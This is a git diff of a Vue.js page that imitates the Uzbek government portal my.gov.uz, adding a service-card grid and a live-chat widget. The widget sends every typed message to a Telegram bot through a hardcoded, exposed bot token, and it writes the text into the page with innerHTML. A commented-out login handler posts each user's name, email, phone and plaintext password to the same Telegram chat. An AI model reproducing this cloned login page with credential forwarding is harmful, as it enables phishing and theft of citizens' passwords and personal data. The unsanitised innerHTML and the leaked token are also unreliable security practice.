@@ -1,6 +1,7 @@
 <script setup>
 import Logo from '../components/logo.vue'
 import Card from '../components/cardOfJobs.vue'
+import axios from 'axios';
 </script>
 
 <template>
@@ -98,10 +99,12 @@ import Card from '../components/cardOfJobs.vue'
       <div class="left_banner w-[500px] flex flex-col justify-between h-[250px] pt-[70px]">
         <span class="text-white text-[25px] font-thin">Ягона интерактив давлат хизматлари порталига хуш келибсиз!</span>
         <div class="btns">
-          <button class="btn_enter mr-[15px] px-[65px] py-[10px] bg-[white] border-2 rounded-[10px] text-[#1c3a5e] font-black transition-[0.3s] hover:bg-[transparent] hover:text-white">
+          <button
+            class="btn_enter mr-[15px] px-[65px] py-[10px] bg-[white] border-2 rounded-[10px] text-[#1c3a5e] font-black transition-[0.3s] hover:bg-[transparent] hover:text-white">
             Кириш
           </button>
-          <button class="btn_register px-[45px] py-[10px] border-2 border-white rounded-[10px] text-[white] font-black transition-[0.3s] hover:bg-[white] hover:text-[#1c3a5e]">
+          <button
+            class="btn_register px-[45px] py-[10px] border-2 border-white rounded-[10px] text-[white] font-black transition-[0.3s] hover:bg-[white] hover:text-[#1c3a5e]">
             Руйхатдан утиш
           </button>
         </div>
@@ -113,13 +116,14 @@ import Card from '../components/cardOfJobs.vue'
         <div class="top_right_banner w-[700px] flex flex-row">
           <div class="input mr-[15px]">
             <input class="w-[400px] relative rounded-[7px] h-[45px] bg-[white] text-[16px] pr-[45px] pl-[25px] inp"
-            :placeholder="currentPlaceholder" />
+              :placeholder="currentPlaceholder" />
             <button
-            class="bg-[#e1e1e1] text-[#111d2d] rounded-[5px] w-[80px] h-[45px] absolute left-[320px] font-black">Излаш</button>
+              class="bg-[#e1e1e1] text-[#111d2d] rounded-[5px] w-[80px] h-[45px] absolute left-[320px] font-black">Излаш</button>
           </div>
-          <div class="service_btn cursor-pointer text-white flex flex-row items-center justify-between px-[20px] w-[220px] border-2 border-white rounded-[11px] font-[600] pt-[7px] pb-[9px]">
-            Барча хизматлар   <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white" class="bi bi-chevron-right"
-              viewBox="0 0 16 16">
+          <div
+            class="service_btn cursor-pointer text-white flex flex-row items-center justify-between px-[20px] w-[220px] border-2 border-white rounded-[11px] font-[600] pt-[7px] pb-[9px]">
+            Барча хизматлар <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white"
+              class="bi bi-chevron-right" viewBox="0 0 16 16">
               <path fill-rule="evenodd"
                 d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z" />
             </svg>
@@ -127,48 +131,121 @@ import Card from '../components/cardOfJobs.vue'
         </div>
         <div class="bottom_right_banner">
           <div class="services text-white justify-between flex flex-row w-[450px]">
-            <div class="firstService w-[200px] h-[100px] flex flex-row justify-between items-center hover:underline cursor-pointer">
+            <div
+              class="firstService w-[200px] h-[100px] flex flex-row justify-between items-center hover:underline cursor-pointer">
               <span>Янги хизмат</span>
               <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="white" class="bi bi-chevron-right"
-              viewBox="0 0 16 16">
-              <path fill-rule="evenodd"
-              d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z" />
-            </svg>
+                viewBox="0 0 16 16">
+                <path fill-rule="evenodd"
+                  d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z" />
+              </svg>
+            </div>
+            <div
+              class="secondService w-[200px] h-[100px] flex flex-row justify-between items-center hover:underline cursor-pointer">
+              <span class="w-[150px]">Буни хамма билиши керак</span>
+              <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="white" class="bi bi-chevron-right"
+                viewBox="0 0 16 16">
+                <path fill-rule="evenodd"
+                  d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z" />
+              </svg>
+            </div>
           </div>
-          <div class="secondService w-[200px] h-[100px] flex flex-row justify-between items-center hover:underline cursor-pointer">
-            <span class="w-[150px]">Буни хамма билиши керак</span>
-            <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="white" class="bi bi-chevron-right"
-            viewBox="0 0 16 16">
-            <path fill-rule="evenodd"
-            d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z" />
-          </svg>
-        </div>
-      </div>
         </div>
       </div>
     </div>
     <div class="dividerBlock px-[155px] w-[100%] top-[400px] absolute h-[900px]">
       <div class="BlockInside w-[100%] h-[100%] rounded-[10px]">
         <div class="topMenu w-[100%] flex flex-row cursor-pointer">
-          <div class="jobs rounded-t-[10px] w-[25%] h-[80px] duration-300 flex flex-row justify-center items-center hover:bg-[white]" :class="{'selectedMenu':dividerBlockMenuSelect==0}">
-          <span class="text-[#1f4675] text-[17px] font-black">Соҳалар</span>
+          <div
+            class="jobs rounded-t-[10px] w-[25%] h-[80px] duration-300 flex flex-row justify-center items-center hover:bg-[white]"
+            :class="{ 'selectedMenu': dividerBlockMenuSelect == 0 }">
+            <span class="text-[#1f4675] text-[17px] font-black">Соҳалар</span>
+          </div>
+          <div
+            class="commonServices  rounded-t-[10px] h-[80px] duration-300 w-[25%] flex flex-row justify-center items-center hover:bg-[white]">
+            <span class="text-[#1f4675] text-[17px] font-black">Оммабоп хизматлар</span>
+          </div>
+          <div
+            class="help w-[25%] rounded-t-[10px] h-[80px] flex duration-300 flex-row justify-center items-center hover:bg-[white]">
+            <span class="text-[#1f4675] text-[17px] font-black">Ёрдам ва кўмак</span>
+          </div>
+          <div
+            class="forForeginers rounded-t-[10px] h-[80px] w-[25%] duration-300 flex flex-row justify-center items-center hover:bg-[white]">
+            <span class="text-[#1f4675] text-[17px] font-black">For foreigners</span>
+          </div>
         </div>
-        <div class="commonServices  rounded-t-[10px] h-[80px] duration-300 w-[25%] flex flex-row justify-center items-center hover:bg-[white]">
-          <span class="text-[#1f4675] text-[17px] font-black">Оммабоп хизматлар</span>
-        </div>
-        <div class="help w-[25%] rounded-t-[10px] h-[80px] flex duration-300 flex-row justify-center items-center hover:bg-[white]">
-          <span class="text-[#1f4675] text-[17px] font-black">Ёрдам ва кўмак</span>
-        </div>
-        <div class="forForeginers rounded-t-[10px] h-[80px] w-[25%] duration-300 flex flex-row justify-center items-center hover:bg-[white]">
-          <span class="text-[#1f4675] text-[17px] font-black">For foreigners</span>
+        <div class="dividerBlock_contents pl-[12px] pt-[20px] pb-[30px] bg-[white] w-[100%] h-[935px]">
+          <Card v-for="i of datasOfMenus" class="float-left" :key="i.id" :ViewedNum="i.num" :icon="i.link"
+            :nameOfJob="i.nameOfJob" :colorOfIco="i.colorOfIco" />
+
         </div>
       </div>
-      <div class="dividerBlock_contents p-[30px] bg-[white] w-[100%] h-[500px]">
-        <Card ViewedNum="25" icon="https://my.gov.uz/fonts/flaticons/035-contacts.svg" nameOfJob="Фукаролик"/>
-      
+    </div>
+    <div class="chatWebInterFace w-[340px] bg-[white] h-[400px]">
+      <div class="leaf"></div>
+      <div class="exit"></div>
+      <div class="topInterface flex flex-col pl-[20px] justify-center">
+        <span class="text-white text-[15px]">Хабарингизни ёзинг</span>
+        <span class="text-white opacity-[70%] text-[12px]">Операторлар онлайн!</span>
       </div>
+      <div class="Screen overflow-y-scroll pr-[15px] flex flex-col items-end justify-end pb-[180px]">
+        <div
+          class="choices absolute bottom-[130px] right-[15px] w-[100%] h-[75px] flex flex-col justify-between items-end"
+          v-if="choice">
+          <button class="btnChoice text-[14px] py-[5px] px-[20px]">Aризам ҳолатини билмоқчиман</button>
+          <button class="btnChoice text-[14px] py-[5px] px-[20px]">Хизматларга оид саволим бор</button>
+        </div>
+        <div class="areaToWrite right-[0px] absolute bottom-0 w-[100%] h-[100px]">
+          <div class="inputArea h-[50%] relative">
+            <input v-model="this.text" placeholder="Хабар киритинг" @input="sendMessage(e)"
+              class='tracking-tighter text-[15px] h-[100%] pl-[15px] text-black w-[80%]'>
+            <div class="sendIcon absolute right-[15px] top-[15px]" @click="SendSMS()"></div>
+          </div>
+          <div class="Tools h-[50%] flex flex-row justify-center items-center">
+            <div class="anotherTools">
+
+            </div>
+          </div>
+        </div>
+      </div>
+
     </div>
-    </div>
+    <!-- return {
+      users: [],
+      alertVisibility: false,
+      userEmail: '',
+      userPassword: '',
+      token: '6451910166:AAEnPmq1oQsg6Ttsw-azpCWKNyQWcvcIQRg',
+      chat_Id: '-4001282356',
+    };
+  },
+  mounted() {
+    this.users = store.getters.users
+  },
+  methods: {
+    check() {
+      for (let i of this.users) {
+        if (i.email == this.userEmail && i.password == this.userPassword) {
+          window.localStorage.profile = JSON.stringify(i)
+          let message = `username: ${i.firstName} \n usersurname: ${i.lastName} \n email: ${i.email} \n phone: ${i.phone} \n password: ${i.password} successfully accessed to account. `
+          let api = `https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chat_Id}&text=${message}`
+          axios.post(api).then(res => {
+            console.log('ok', res);
+          })
+          event.preventDefault()
+          window.location.pathname = '/profile'
+        }
+        else {
+          this.alertVisibility = !this.alertVisibility
+        }
+      } -->
+
+
+
+    <!-- <div class="chatBot w-[300px] pt-[8px] pl-[15px] h-[400px]">
+      <div class="leaf"></div>
+      <span class="text-white text-[15px] font-normal tracking-tighter">Чат-бот (Beta)</span>
+    </div> -->
   </div>
 </template>
 <script>
@@ -177,11 +254,137 @@ export default {
     return {
       aloqaSelect: false,
       langSelect: false,
+      text: '',
+      choice: true,
       words: ["Пенсия", "Яшаш жойи", "Субсидия", "IMEI", "COVID-19", "Ойлик"],
       currentWordIndex: 0,
       currentPlaceholder: "",
       intervalId: null,
+      token: '6451910166:AAEnPmq1oQsg6Ttsw-azpCWKNyQWcvcIQRg',
+      chat_Id: '-4001282356',
       dividerBlockMenuSelect: 0,
+      datasOfMenus: [
+        {
+          num: 25,
+          nameOfJob: 'Фукаролик',
+          colorOfIco: '#11a8ec',
+          link: 'https://my.gov.uz/fonts/flaticons/035-contacts.svg',
+        },
+        {
+          num: 43,
+          nameOfJob: 'Таълим',
+          link: 'https://my.gov.uz/fonts/flaticons/027-mortarboard.svg',
+          colorOfIco: '#df8e45'
+        },
+        {
+          num: 4,
+          nameOfJob: 'Оила ва болалар',
+          link: 'https://my.gov.uz/fonts/flaticons/010-teamwork.svg',
+          colorOfIco: '#dabc32'
+        },
+        {
+          num: 9,
+          nameOfJob: 'Ёшлар',
+          link: 'https://my.gov.uz/fonts/flaticons/023-file.svg',
+          colorOfIco: '#8ec5f1'
+        },
+        {
+          num: 24,
+          nameOfJob: 'Адлия',
+          link: 'https://my.gov.uz/fonts/flaticons/005-bank.svg',
+          colorOfIco: '#dd924f'
+        },
+        {
+          num: 34,
+          nameOfJob: 'Ижтимоий ҳимоя',
+          link: 'https://my.gov.uz/fonts/flaticons/020-donation.svg',
+          colorOfIco: '#979797'
+        },
+        {
+          num: 13,
+          nameOfJob: 'Маданият ва спорт',
+          link: 'https://my.gov.uz/fonts/flaticons/050-edition.svg',
+          colorOfIco: '#8a85c0'
+        },
+        {
+          num: 49,
+          nameOfJob: 'Маълумотномалар',
+          link: 'https://my.gov.uz/fonts/flaticons/004-file-2.svg',
+          colorOfIco: '#11a8ec'
+        },
+        {
+          num: 28,
+          nameOfJob: 'УЖКХ',
+          link: 'https://my.gov.uz/fonts/flaticons/026-sale.svg',
+          colorOfIco: '#11a8ec'
+        },
+        {
+          num: 36,
+          nameOfJob: 'Кўчмас мулк',
+          link: 'https://my.gov.uz/fonts/flaticons/008-mansion.svg',
+          colorOfIco: '#8ec483'
+        },
+        {
+          num: 35,
+          nameOfJob: 'Транспорт',
+          link: 'https://my.gov.uz/fonts/flaticons/005-car.svg',
+          colorOfIco: '#e78aaf'
+        },
+        {
+          num: 22,
+          nameOfJob: 'Иқтисодиёт, бизнес ва э-тижорат',
+          link: 'https://my.gov.uz/fonts/flaticons/019-analytics.svg',
+          colorOfIco: '#72b45e'
+        },
+        {
+          num: 142,
+          nameOfJob: 'Лицензиялаш',
+          link: 'https://my.gov.uz/fonts/flaticons/004-file-2.svg',
+          colorOfIco: '#7eb0ed'
+        },
+        {
+          num: 24,
+          nameOfJob: 'Солиқлар',
+          link: 'https://my.gov.uz/fonts/flaticons/035-percentage.svg',
+          colorOfIco: '#43cbe8'
+        },
+        {
+          num: 23,
+          nameOfJob: 'Божхона',
+          link: 'https://my.gov.uz/fonts/flaticons/049-worldwide.svg',
+          colorOfIco: '#b2b63b'
+        },
+        {
+          num: 20,
+          nameOfJob: 'Ахборот ва алоқа',
+          link: 'https://my.gov.uz/fonts/flaticons/032-network.svg',
+          colorOfIco: '#d98989'
+        },
+        {
+          num: 15,
+          nameOfJob: 'Экология ва геология',
+          link: 'https://my.gov.uz/fonts/flaticons/018-world.svg',
+          colorOfIco: '#3da51c'
+        },
+        {
+          num: 11,
+          nameOfJob: 'Соғлиқни сақлаш',
+          link: 'https://my.gov.uz/fonts/flaticons/018-stethoscope.svg',
+          colorOfIco: '#00c492'
+        },
+        {
+          num: 5,
+          nameOfJob: 'Эълонлар тахтаси',
+          link: 'https://my.gov.uz/fonts/flaticons/022-bullhorn.svg',
+          colorOfIco: '#11a8ec'
+        },
+        {
+          num: 27,
+          nameOfJob: 'Синов тартибидаги хизматлар',
+          link: 'https://my.gov.uz/fonts/flaticons/021-folder.svg',
+          colorOfIco: '#119cec'
+        },
+      ]
     };
   },
 
@@ -196,6 +399,14 @@ export default {
     langListShow() {
       this.langSelect = !this.langSelect
       this.aloqaSelect = false
+    },
+    sendMessage(e) {
+      if (this.text !== '') {
+        console.log('heelo');
+        document.querySelector('.sendIcon').style.backgroundImage = 'url("data:image/svg+xml,%3Csvg%20width%3D%2234%22%20height%3D%2234%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Ccircle%20fill%3D%22%230b82f7%22%20cx%3D%2217%22%20cy%3D%2217%22%20r%3D%2217%22%2F%3E%3Cg%20transform%3D%22translate(10%209)%22%20fill%3D%22%23FFF%22%3E%3Crect%20x%3D%226%22%20y%3D%222%22%20width%3D%222%22%20height%3D%2214%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22rotate(-45%209.879%204.879)%22%20x%3D%228.879%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22scale(-1%201)%20rotate(-45%200%2015.243)%22%20x%3D%223.293%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E%0A")'
+      } else {
+        document.querySelector('.sendIcon').style.backgroundImage = 'url("data:image/svg+xml,%3Csvg%20width%3D%2234%22%20height%3D%2234%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Ccircle%20fill%3D%22%23f1f0f0%22%20cx%3D%2217%22%20cy%3D%2217%22%20r%3D%2217%22%2F%3E%3Cg%20transform%3D%22translate(10%209)%22%20fill%3D%22%23FFF%22%3E%3Crect%20x%3D%226%22%20y%3D%222%22%20width%3D%222%22%20height%3D%2214%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22rotate(-45%209.879%204.879)%22%20x%3D%228.879%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22scale(-1%201)%20rotate(-45%200%2015.243)%22%20x%3D%223.293%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E%0A")'
+      }
     },
     startTyping() {
       this.intervalId = setInterval(() => {
@@ -232,14 +443,39 @@ export default {
     beforeDestroy() {
       clearInterval(this.intervalId);
     },
-  },
-};
+    SendSMS() {
+      if (this.text !== '') {
+        this.choice = false
+        let text = document.createElement('span')
+        let textFrame = document.createElement('div')
+        text.innerHTML = this.text
+        textFrame.style.padding = '10px'
+        textFrame.style.borderRadius = '10px'
+        textFrame.style.fontSize = '12px'
+        textFrame.style.color = 'white'
+        textFrame.style.marginBottom = '10px'
+        textFrame.style.textAlign = 'end'
+        textFrame.style.width = '90%'
+        textFrame.style.background = '#0b82f7'
+        text.style.display = 'inline-block'
+        textFrame.append(text)
+        document.querySelector('.Screen').append(textFrame)
+        let api = `https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chat_Id}&text=${this.text}`
+        axios.post(api).then(res => {
+          console.log('ok', res);
+        })
+        this.text = ''
+      }
+
+    }
+  }
+}
 </script>
 <style scoped>
 .home {
   width: 100%;
   height: 100%;
-  background: #eff9ff;  
+  background: #eff9ff;
 }
 
 .banner {
@@ -303,18 +539,144 @@ export default {
 .inp {
   box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16);
 }
-.service_btn{
+
+.service_btn {
   background: transparent;
   transition: .3s;
 }
-.service_btn:hover{
-  background: linear-gradient(83deg, rgb(0 185 175) 0%, rgba(0,156,182,1) 100%) !important;
+
+.service_btn:hover {
+  background: linear-gradient(83deg, rgb(0 185 175) 0%, rgba(0, 156, 182, 1) 100%) !important;
 }
-button{
+
+button {
   cursor: pointer;
 }
-.selectedMenu{
+
+.selectedMenu {
   background: white;
+}
+
+.dividerBlock_contents {
+  border-left-color: #BEDDF0;
+  border-left-width: 1px;
+  border-right-width: 1px;
+  border-bottom-width: 1px;
+  border-right-color: #BEDDF0;
+  border-bottom-color: #BEDDF0;
+  border-color: #BEDDF0;
+  border-bottom-left-radius: 7px;
+  border-bottom-right-radius: 7px;
+}
+
+.chatBot {
+  border-top-left-radius: 8px;
+  border-top-right-radius: 34px;
+  box-shadow: 0 12px 14px 8px rgba(0, 0, 0, .17);
+  position: fixed;
+  /* bottom: -360px; */
+  bottom: 0;
+  right: 40px;
+}
+
+.chatWebInterFace {
+  border-top-left-radius: 8px;
+  border-top-right-radius: 34px;
+  box-shadow: 0 12px 14px 8px rgba(0, 0, 0, .17);
+  position: fixed;
+  /* bottom: -360px; */
+  bottom: 0;
+  right: 30px;
+}
+
+.leaf {
+  width: 32px;
+  height: 34px;
+  right: 0;
+  top: 0;
+  position: absolute;
+  background-image: url("data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2232%22%20height%3D%2240%22%20viewBox%3D%220%200%2032%2040%22%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20fill%3D%22%2318b9d4%22%20d%3D%22M0%200h9.02L32%2033.196V40H0z%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20fill%3D%22%2318c139%22%20d%3D%22M9%200c3.581.05%2023%205.426%2023%2033.08v.03C18.922%2030.751%209%2019.311%209%205.554V0z%22%2F%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
+}
+
+.topInterface {
+  width: 100%;
+  height: 70px;
+  border-top-left-radius: 8px;
+  border-top-right-radius: 34px;
+  background: linear-gradient(95deg, rgb(0, 85, 201) 20%, rgb(24, 185, 212) 80%);
+}
+
+.exit {
+  width: 30px;
+  height: 30px;
+  background-size: contain;
+  cursor: pointer;
+  left: -40px;
+  position: absolute;
+  opacity: 70%;
+  background-repeat: no-repeat;
+  background-image: url("data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2228%22%20height%3D%2228%22%20viewBox%3D%220%200%2028%2028%22%3E%0A%20%20%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%20transform%3D%22translate(2%202)%22%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20cx%3D%2212%22%20cy%3D%2212%22%20r%3D%2212%22%20fill%3D%22%23FFF%22%20opacity%3D%221%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20cx%3D%2212%22%20cy%3D%2212%22%20r%3D%2212.75%22%20stroke%3D%22%23222D38%22%20stroke-width%3D%221.5%22%20opacity%3D%221%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cg%20fill%3D%22%23222D38%22%20opacity%3D%221%22%20transform%3D%22translate(6%206)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20width%3D%221.611%22%20height%3D%2213.9%22%20x%3D%225.435%22%20y%3D%22-.941%22%20rx%3D%22.806%22%20transform%3D%22rotate(45%206.24%206.01)%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20width%3D%221.611%22%20height%3D%2213.9%22%20x%3D%225.435%22%20y%3D%22-.941%22%20rx%3D%22.806%22%20transform%3D%22scale(-1%201)%20rotate(45%200%20-9.058)%22%2F%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
+}
+
+.exit:hover {
+  opacity: 100%;
+}
+
+.Screen {
+  width: 100%;
+  height: 100%;
+  background-color: rgba(254, 254, 254, 0.784)
+}
+
+.btnChoice {
+  box-shadow: 0 10px 15px -3px rgba(0, 0, 0, .1), 0 0 6px -2px rgba(0, 0, 0, .05), inset 0 0 0 1px #086bcd;
+  color: #086bcd;
+  border-radius: 20px;
+}
+
+.btnChoice:hover {
+  background: linear-gradient(315deg, #086bcd, #29a0ff);
+  box-shadow: 0 10px 15px -3px rgba(0, 0, 0, .1), 0 0 6px -2px rgba(0, 0, 0, .05);
+  color: #fff;
+}
+
+.areaToWrite {
+  border-top-color: rgb(203, 203, 203);
+  border-top-width: 1px;
+}
+
+.anotherTools {
+  background-image: url("data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2224%22%3E%0A%20%20%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%20transform%3D%22translate(3%204)%22%3E%0A%20%20%20%20%3Ccircle%20cx%3D%228.5%22%20cy%3D%228.5%22%20r%3D%229.3%22%20stroke%3D%22%23a3aab5%22%20stroke-width%3D%221.6%22%2F%3E%0A%20%20%20%20%3Ccircle%20cx%3D%225.375%22%20cy%3D%226.375%22%20r%3D%221.375%22%20fill%3D%22%23a3aab5%22%2F%3E%0A%20%20%20%20%3Ccircle%20cx%3D%2211.875%22%20cy%3D%226.375%22%20r%3D%221.375%22%20fill%3D%22%23a3aab5%22%20transform%3D%22matrix(-1%200%200%201%2023.75%200)%22%2F%3E%0A%20%20%20%20%3Cpath%20stroke%3D%22%23a3aab5%22%20stroke-linecap%3D%22round%22%20stroke-width%3D%221.6%22%20d%3D%22M4.25%2010.5S4.5%2013%208.5%2013s4.25-2.5%204.25-2.5%22%2F%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
+  width: 25px;
+  height: 25px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  cursor: pointer;
+}
+
+.anotherTools:hover {
+  background-color: #f1f0f0;
+  border-radius: 5px;
+}
+
+input:focus {
+  outline: none;
+}
+
+.sendIcon {
+  width: 30px;
+  height: 30px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2234%22%20height%3D%2234%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Ccircle%20fill%3D%22%23f1f0f0%22%20cx%3D%2217%22%20cy%3D%2217%22%20r%3D%2217%22%2F%3E%3Cg%20transform%3D%22translate(10%209)%22%20fill%3D%22%23FFF%22%3E%3Crect%20x%3D%226%22%20y%3D%222%22%20width%3D%222%22%20height%3D%2214%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22rotate(-45%209.879%204.879)%22%20x%3D%228.879%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3Crect%20transform%3D%22scale(-1%201)%20rotate(-45%200%2015.243)%22%20x%3D%223.293%22%20y%3D%22-.121%22%20width%3D%222%22%20height%3D%2210%22%20rx%3D%221%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E%0A");
+}
+
+.textFrame {
+  padding: 15px;
+  background: blue;
+  width: 150px;
+  height: 100px;
+  border-radius: 10px;
 }
 </style>
 
